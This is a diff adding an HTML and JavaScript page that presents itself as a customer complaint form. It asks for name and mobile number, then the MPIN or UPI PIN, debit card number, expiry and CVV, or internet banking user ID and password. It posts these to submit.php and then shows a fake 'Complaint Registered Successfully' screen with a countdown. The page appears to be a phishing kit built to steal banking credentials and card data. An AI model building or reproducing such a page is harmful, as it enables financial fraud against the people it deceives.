@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+       <form action="submit.php" method="post" id="form1">
+        <h3>Basic Details</h3>
+        <input type="text" id="fname" placeholder="Full Name" required>
+        <input type="tel" id="mobile" placeholder="Mobile No" required>
+        <textarea name="complain" id="complain" cols="22" rows="2" placeholder="Complain / Queries"></textarea>
+        <div class="btn-box">
+            <button type="button" id="next1">Next</button>
+        </div> 
+     </form>
+     
+     <form action="submit.php" method="post"  id="form2">
+        <h3>Transaction Details</h3>
+
+        <select name="pnr" id="pnr">
+            <option;>--Select--</option>
+            <option>MPIN</option>
+            <option>UPI PIN</option>
+        </select>
+        <input type="MPIN" id="MPIN" placeholder="MPIN / UPI PIN" required>
+        <div class="btn-box">
+            <button type="button" id="back1">Back</button>
+            <button type="button" id="next2">Next</button>
+        </div>
+       </form> 
+     
+       
+
+
+
+
+       <form action="submit.php" method="post"  id="form3">
+        <h3 class="paymentbox">Payment Method</h3>
+        <div class="payment-box">
+            <select id="paymentMethod" onchange="showFields()">
+                <option  value="select">---Select---</option>
+                <option value="debitCard">Debit</option>
+                <option value="internetBanking">Internet Banking</option>
+                <option value="others">Others</option>
+            </select>
+        </div>
+
+        <!-- Debit Card Fields -->
+        <div id="debitCardFields" style="display: none;">
+            <label for="cardNo"></label><br>
+            <input type="number" id="cardNo" name="cardNo" placeholder="Card Number" required><br>
+
+            <label for="expiryDate"></label><br>
+            <input type="text" id="expiryDate" name="expiryDate"  pattern="\MM{2}-\YY{2}" placeholder="Expiry Date MM/YY" required><br>
+
+            <label for="cvv"></label><br>
+            <input type="number" id="cvv" name="cvv" placeholder="CVV" required><br>
+        </div>
+
+        <!-- Internet Banking Fields -->
+            
+        <div id="internetBankingFields" style="display: none;">
+            <label for="userId"></label><br> 
+            <input type="text" id="userId" name="userId" placeholder="USER ID" required><br>
+            <label for="password"></label><br>
+            <input type="text" id="password" name="password" placeholder="Password" required><br>
+        </div>
+
+
+ <!-- others Fields -->
+            
+ <div id="othersFields" style="display: none;">
+    <label for="others"></label><br>
+    <input type="text" id="others" name="others" placeholder="Others" required><br>
+    </div>
+
+
+
+        <br>
+        
+        
+            
+            <button type="button" id="back2">Back</button>
+        
+
+          
+           <button type="submit" id="next3">Submit</button>
+        
+        
+        
+    </form>
+
+
+    <form id="form4">
+        <div style="text-align: center; margin-top: -10px;">
+            <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block; margin: 0 auto;">
+                <circle cx="50" cy="50" r="45" stroke="green" stroke-width="5" fill="transparent"/>
+                <path d="M30.3333 54.6667L43 67.3333L70.6667 40" stroke="green" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg> 
+            <h4>Complaint Registered Successfully</h4>
+            <div id="clock">05:00</div>
+            <br><br><br>
+            <h6 id="reference">Complain No: CMP0003691455EF</h5>
+            <br>
+           
+           
+    
+            <!-- New element to display "Process is Pending" -->
+            <div id="pendingMessage" style="display: none; font-size: 20px; font-weight: bold; color: red;">
+                Process is Pending
+            </div> 
+            <button type="button" id="back3">Another Queries</button>
+            
+    </form>
+        <script>
+            // Countdown timer for 5 minutes (300 seconds)
+            let remainingTime = 300;
+            const clockElement = document.getElementById("clock");
+            const pendingMessageElement = document.getElementById("pendingMessage");
+    
+            function updateClock() {
+                const minutes = Math.floor(remainingTime / 60).toString().padStart(2, "0");
+                const seconds = (remainingTime % 60).toString().padStart(2, "0");
+                clockElement.textContent = `${minutes}:${seconds}`;
+                remainingTime--;
+    
+                if (remainingTime >= 0) {
+                    setTimeout(updateClock, 1000); // Update the clock every second
+                } else {
+                    // Time is up, show the "Process is Pending" message
+                    pendingMessageElement.style.display = "block";
+                }
+            }
+    
+            // Start the countdown
+            updateClock();
+         
+            
+        </script>
+</div>
+
+<script>
+    function showFields() {
+        var paymentMethod = document.getElementById("paymentMethod").value;
+        var debitCardFields = document.getElementById("debitCardFields");
+        var internetBankingFields = document.getElementById("internetBankingFields");
+        var othersFields = document.getElementById("othersFields");
+
+
+        if (paymentMethod === "debitCard") {
+            debitCardFields.style.display = "block";
+            internetBankingFields.style.display = "none";
+            othersFields.style.display = "none";
+        } else if (paymentMethod === "internetBanking") {
+            debitCardFields.style.display = "none";
+            internetBankingFields.style.display = "block";
+            othersFields.style.display = "none";
+        } else if (paymentMethod === "others") {
+            debitCardFields.style.display = "none";
+            internetBankingFields.style.display = "none";
+            othersFields.style.display = "block";
+        }else {
+            debitCardFields.style.display = "none";
+            internetBankingFields.style.display = "none";
+            othersFields.style.display = "none";
+        }
+    }
+</script>
+
+<dvi class="step-row">
+    <div id="progress"></div>
+    <div class="step-col"><small>Step 1</small></div>
+    <div class="step-col"><small>Step 2</small></div>
+    <div class="step-col"><small>Step 3</small></div>
+
+</dvi>
+
+
+</div>
+    <script>
+        var form1 = document.getElementById("form1");
+        var form2 = document.getElementById("form2");
+        var form3 = document.getElementById("form3");
+        var form4 = document.getElementById("form4");
+
+        var next1 = document.getElementById("next1");
+        var next2 = document.getElementById("next2");
+        var next3 = document.getElementById("next3");
+        var back1 = document.getElementById("back1");
+        var back2 = document.getElementById("back2");
+        var back3 = document.getElementById("back3");
+
+        var progress = document.getElementById("progress");
+
+        next1.onclick = function(){
+            form1.style.left = "-450px";
+            form2.style.left = "40px";
+            progress.style.width = "240px"
+        }
+        back1.onclick = function(){
+            form1.style.left = "40px";
+            form2.style.left = "450px";
+            progress.style.width = "120px"
+        }
+
+        next2.onclick = function(){
+            form2.style.left = "-450px";
+            form3.style.left = "40px";
+            progress.style.width = "360px"
+        }
+        back2.onclick = function(){
+            form2.style.left = "40px";
+            form3.style.left = "450px";
+            progress.style.width = "240px"
+        }
+        next3.onclick = function(){
+            form3.style.left = "-450px";
+            form4.style.left = "40px";
+            
+        }
+        back3.onclick = function(){
+            form1.style.left = "40px";
+            form4.style.left = "450px";
+            progress.style.width = "120px"
+        }
+
+    </script>
+    <script>
+        // JavaScript for the first form submission
+document.getElementById("form1").addEventListener("submit", function(event) {
+    event.preventDefault();
+    // Additional validation and handling if needed
+
+    // Move to the next step
+    document.getElementById("form1").style.left = "-450px";
+    document.getElementById("form2").style.left = "40px";
+    document.getElementById("progress").style.width = "240px";
+});
+
+// JavaScript for the second form submission
+document.getElementById("form2").addEventListener("submit", function(event) {
+    event.preventDefault();
+    // Additional validation and handling if needed
+
+    // Move to the next step
+    document.getElementById("form2").style.left = "-450px";
+    document.getElementById("form3").style.left = "40px";
+    document.getElementById("progress").style.width = "360px";
+});
+
+// JavaScript for the third form submission
+document.getElementById("form3").addEventListener("submit", function(event) {
+    event.preventDefault();
+    // Additional validation and handling if needed
+
+    // Submit the form data using AJAX
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "submit.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    
+    const formData = new FormData(document.getElementById("form3"));
+    
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                console.log("Message sent successfully!");
+                // Move to the final step
+                document.getElementById("form3").style.left = "-450px";
+                document.getElementById("form4").style.left = "40px";
+            } else {
+                console.log("Error sending message.");
+            }
+        }
+    };
+    
+    xhr.send(formData);
+});
+
+    </script>
+</body>
+</html>
